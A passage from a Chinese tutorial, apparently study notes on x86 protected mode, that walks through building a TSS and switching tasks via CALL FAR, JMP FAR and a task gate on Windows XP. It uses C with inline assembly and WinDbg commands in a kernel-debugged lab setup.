<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link 由CPU自己填充，表示上一个任务TR的选择子</span></span><br><span class="line">TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>准备TSS段描述符并写入GDT表P&#x3D;0的位置，XX00E9XX &#96;XXXX0068，X为申请的104字节内存的首地址。</p>
<ul>
<li>G位为0，单位是字节</li>
<li><strong>TSS一开始的类型是9（可用），当加载到TR中就会变成B（ 正被占用）</strong></li>
</ul>
</li>
<li><p>完整代码如下。需要注意：</p>
<ul>
<li>程序运行时需要修改CR3的值，使用<code>!process 0 0</code></li>
<li>TSS中的EIP为即将要执行的函数的入口地址</li>
<li>TSS中的ESP为即将要执行的函数的堆栈地址，但是堆栈是往低地址使用，所以需要给ESP赋值一个已经申请预留的堆栈中的一个相对较高的地址</li>
<li>IO位图、GS、LDT Windows已经没有使用了（win7没用IO位图）</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwOk;</span><br><span class="line">DWORD dwESP;</span><br><span class="line">DWORD dwCS;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		push fs</span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span> <span class="comment">// int 3 会修改FS</span></span><br><span class="line">		pop fs</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">1</span></span><br><span class="line">		mov dword ptr ds:[dwOk],eax</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov dword ptr ds:[dwESP],eax</span><br><span class="line">		mov ax,cs</span><br><span class="line">		mov word ptr ds:[dwCS],ax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;	</span><br><span class="line">	DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line">	<span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">	DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制当前进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr[buff]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ok: %d\nESP: %x\nCS: %x\n&quot;</span>, dwOk, dwESP, dwCS);</span><br><span class="line">  system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在XP中执行上述代码。</p>
</li>
<li><p>此时根据提示在Windbg中修改GDT表的段描述符：</p>
<p><code>eq 8003f048 0000e93a·00000068</code></p>
<p><code>!process 0 0;g</code>获取CR3的值</p>
</li>
<li><p>根据CR3的值回到XP中输入并回车，此时将会在Windbg中断在int 3，输入g执行返回，如果使用p单步将无法正常返回。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/Dl5oFmrBJ9OTk7p.png" alt="80.png"></p>
</li>
<li><p>使用int 3断下来后单步调试时观察堆栈和寄存器。</p>
<ol>
<li><p>在XP中执行CALL FAR前下断点观察寄存器。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/HuKtv4WOYDpjV9S.png" alt="81.png"></p>
</li>
<li><p>观察此时的TSS情况。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/dOR5ILA8T3epFhU.png" alt="82.png"></p>
</li>
<li><p>在XP中取消断点后F5执行，此时Windbg中查看0堆栈情况。堆栈中即为函数压入栈的8个通用寄存器、EFLAG寄存器、FS段寄存器。观察寄存器值也都成功替换。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/BvuEY8s3PUI6d2j.png" alt="83.png"></p>
</li>
<li><p>此时观察TSS中的数值。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/h8KYrMCgleUoOEt.png" alt="84.png"></p>
</li>
<li><p>根据段选择子0x0028找到对应的段描述符80008b04&#96;200020ab为任务切换的TSS段描述符，纪录的TSS段起始地址为：80042000，如下图即为上一个TSS段内存的数据。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/4XDRobaiBlAszr1.png" alt="85.png"></p>
</li>
</ol>
</li>
</ol>
<h3 id="3-5-练习：使用JMP调用任务段修改所有寄存器"><a href="#3-5-练习：使用JMP调用任务段修改所有寄存器" class="headerlink" title="3.5 练习：使用JMP调用任务段修改所有寄存器"></a>3.5 练习：使用JMP调用任务段修改所有寄存器</h3><p><strong>JMP FAR</strong>：  NT位置0，不会修改TSS previous task link（PTL）。</p>
<p>分别使用两种方式返回：</p>
<ul>
<li><p>JMP：既然是JMP触发执行的任务段，那也可以在裸函数中使用JMP跳到之前的TR保存的任务段进行返回。</p>
</li>
<li><p>iretd：由于JMP FAR任务段不会保存PTL，且NT位置0，则需要在裸函数中将前一个TR的选择子填充到TSS的前2字节和NT置1。（但是在真正测试时<strong>即使在iretd前修改NT位为1，当执行到EIP&#x3D;iretd时CPU还是会将NT位置为0，无法正确返回。</strong>）</p>
</li>
</ul>
<ol>
<li><p>准备TSS。</p>
</li>
<li><p>准备TSS段描述符并写入GDT表P&#x3D;0的位置，XX00E9XX &#96;XXXX0068，X为申请的104字节内存的首地址。</p>
</li>
<li><p>完整代码如下。需要获取任务切换前的TR寄存器的段选择子，方便裸函数跳转返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwOk;</span><br><span class="line">DWORD dwESP;</span><br><span class="line">DWORD dwCS;</span><br><span class="line">BYTE PrevTR[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//保存任务切换前的TR段选择子</span></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		push fs</span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span> <span class="comment">// int 3 会修改FS</span></span><br><span class="line">		pop fs</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">1</span></span><br><span class="line">		mov dword ptr ds:[dwOk],eax</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov dword ptr ds:[dwESP],eax</span><br><span class="line">		mov ax,cs</span><br><span class="line">		mov word ptr ds:[dwCS],ax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">      </span><br><span class="line">		jmp fword ptr ds:[PrevTr]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;	</span><br><span class="line">	DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line">	<span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">	DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制当前进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		str ax</span><br><span class="line">		lea edi,[PrevTR+<span class="number">4</span>]<span class="comment">//JMP后面的6个字节，低4字节为EIP，高2字节为段选择子</span></span><br><span class="line">		mov [edi],ax</span><br><span class="line">		popad</span><br><span class="line">      </span><br><span class="line">		jmp fword ptr[buff]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ok: %d\nESP: %x\nCS: %x\n&quot;</span>, dwOk, dwESP, dwCS);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>VC6中运行后到Windbg中写对应的GDT表TSS段描述符，并获取CR3的值。</p>
<ul>
<li>eq 8003f048 0000e93a&#96;00000068</li>
<li><code>!process 0 0;g</code></li>
</ul>
</li>
<li><p>回到XP的VC6中输入CR3值后回车，此时断在裸函数的int 3，观察寄存器和堆栈。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/RDukEgJed1Kn8Sb.png" alt="86.png"></p>
</li>
<li><p>观察TSS段。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/JlnWcM9hX5j7Vsm.png" alt="87.png"></p>
<ul>
<li>此时的PTL&#x3D;0x00，说明JMP AFR任务段确实没有修改TSS中的PTL。</li>
<li>对应的段寄存器的值已经修改成功。</li>
</ul>
</li>
<li><p>此时Windbg中输入<code>g</code>运行后成功返回，如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/XD7qS2vJ3G4R8Ve.png" alt="88.png"></p>
</li>
</ol>
<p>在另外的测试中，使用iretd返回时，即使NT置1，并修改TSS的PTL，当执行到<code>eip=iretd</code>指令时，EFLAG又回自动将NT位置0，所以无法使用iretd进行返回，或者可以尝试使用中断返回试试（使用堆栈）。</p>
<div class="note warning"><p><strong>结论：</strong>3环CALL<strong>任务段选择子</strong> --&gt; GDT找到对应任务段描述符 --&gt; 将任务段描述符加载到TR寄存器，同时根据任务段中的Base找到TSS内存块的起始地址 --&gt; 根据TSS中的EIP去执行代码 --&gt; IRETD返回。</p>
<ol>
<li><strong>CALL任务段不会将返回地址压栈，因为使用TR的选择子跳过去。返回也不会使用到返回地址，而是使用PTL（前一个TR的段选择子）</strong>。</li>
<li>即使在iretd前修改NT位为1，当执行到EIP&#x3D;iretd时CPU还是会将NT位置为0，无法正确返回（<strong>有可能是因为要切回去的那个任务的TSS段描述符的B位为1，正在忙</strong>，处理器是通过TSS的B位来检测重入的。因中断，iret，call，jmp指令发起的任务切换时，处理器固件会检测新任务的TSS的B位，如果该位为1，则处理器不允许这样的任务切换）。</li>
<li><strong>无论何时，只要处理器碰到iret指令，它都会检查NT位。</strong></li>
</ol>
</div>

<p>具体详细的可以参考它的笔记<a href="https://lyy-0217.blog.csdn.net/article/details/85071085">二十六、二十七</a>。</p>
<ul>
<li><a href="https://blog.csdn.net/qq_37375427/article/details/85046543">【OS学习笔记】二十六 保护模式八：任务门—任务切换</a></li>
<li><a href="https://blog.csdn.net/qq_37375427/article/details/85051515">【OS学习笔记】二十七 保护模式八：任务切换的方法之—-jmp与call的区别以及任务的中断嵌套</a></li>
</ul>
<h2 id="4-任务门"><a href="#4-任务门" class="headerlink" title="4 任务门"></a>4 任务门</h2><p>Windows、Linux都没有使用CPU提供的通过TSS来切换线程，而是使用堆栈。那操作系统用TSS来做什么？</p>
<p>既然已经有了任务段为什么还要有任务门？</p>
<div class="note primary"><p>任务门存在的意义其一 <strong>int 8双重错误</strong>举例：</p>
<p>假设一个除以0错误，首先会触发int 0中断去查IDT表中对应的地址去执行，如果在执行过程中如果再次出错时就会触发int 8。</p>
<p>int 8是如何接管处理的呢？一旦进入8号中断，将会替换一堆寄存器，保证CPU 能跳到一个正确的地方去执行（除非那个地方也被破坏了），此时什么错误都无所谓了，收集信息后，蓝屏。</p>
</div>

<p>任务门int 8查的IDT表即为任务门：</p>
<p>IDT–00008500&#96;<strong>0050</strong>1198–0050–0101 0 0 00–0xA–GDT第十一个</p>
<p>GDT–8000<strong>89</strong>55&#96;27000068–32位TSS任务段Base：80552700–dd 80552700–80544509–uf 80544509</p>
<p><strong>调用任务段的三种方法</strong>：<mark class="label danger">CALL/JMP FAR、任务门</mark>。</p>
<p>IDT表可以包含3种门描述符：</p>
<ul>
<li>任务门描述符</li>
<li>中断门描述符</li>
<li>陷阱门描述符</li>
</ul>
<p>任务门描述符：</p>
<p><img data-src="https://s2.loli.net/2021/12/24/YuOsoBST7XwyvdQ.png" alt="89.png"></p>
<p>TSS段描述符结构如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/22/ECYDcgjBQMkbJmK.png" alt="79.png"></p>
<p>任务门的执行过程：</p>
<ol>
<li>INT N指令来去IDT表中找对应的<strong>任务门描述符</strong></li>
<li>查询IDT表找到任务门描述符</li>
<li>通过任务门描述符表的TSS段选择子查询GDT表，找到<strong>任务段描述符</strong></li>
<li>根据TSS段描述符的Base找到TSS任务段内存块</li>
<li>使用TSS段中的值修改寄存器</li>
<li>IRETD返回</li>
</ol>
<p>执行流程图如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/24/QR3gGmZzhtoPdpI.png" alt="94.png"></p>
<h3 id="4-1-练习：使用任务门修改所有的寄存器的值"><a href="#4-1-练习：使用任务门修改所有的寄存器的值" class="headerlink" title="4.1 练习：使用任务门修改所有的寄存器的值"></a>4.1 练习：使用任务门修改所有的寄存器的值</h3><ol>
<li><p>构造任务门段描述符：0000<strong>E5</strong>00&#96;<strong>0048</strong>0000</p>
<ul>
<li>P&#x3D;1</li>
<li>DPL&#x3D;0x11&#x3D;3（能让3环的代码访问到这个门）</li>
<li>S&#x3D;0</li>
<li>0x1110&#x3D;0xE</li>
<li>任务门：0x0101&#x3D;0x5</li>
<li>TSS段选择子：0x0048（查GDT的第10项）0100 1 0 00</li>
</ul>
</li>
<li><p>修改IDT表。（找个P&#x3D;0的，如第33项）eq 8003f500 0000E500&#96;00480000</p>
<p><img data-src="https://s2.loli.net/2021/12/24/QfDWxua4F75YBUJ.png" alt="90.png"></p>
</li>
<li><p>代码如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwOk;</span><br><span class="line">DWORD dwESP;</span><br><span class="line">DWORD dwCS;</span><br><span class="line">DWORD *TSS = <span class="literal">NULL</span>;	 <span class="comment">//TSS内存块</span></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">1</span></span><br><span class="line">		mov dword ptr ds:[dwOk],eax</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov dword ptr ds:[dwESP],eax</span><br><span class="line">		mov ax,cs</span><br><span class="line">		mov word ptr ds:[dwCS],ax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">      </span><br><span class="line">		iretd</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;	</span><br><span class="line">	DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line">	<span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">	TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span 